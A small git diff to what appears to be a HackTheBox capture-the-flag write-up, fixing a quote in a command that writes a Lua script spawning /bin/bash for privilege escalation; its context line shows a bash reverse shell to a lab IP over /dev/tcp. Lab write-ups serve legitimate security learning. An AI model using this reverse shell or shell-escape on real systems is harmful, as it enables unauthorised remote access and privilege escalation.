@@ -129,7 +129,7 @@ bash -c 'bash -i >& /dev/tcp/10.10.14.4/1337 0>&1'
 
 ```
 echo "require('os');" > sysad.lua
-echo "os.execute('/bin/bash'); > sysad.lua
+echo "os.execute('/bin/bash');" > sysad.lua
 ```
 
 ![image](https://github.com/jon-brandy/hackthebox/assets/70703371/b472f3aa-ca88-4f55-93a5-b44f419c6402)
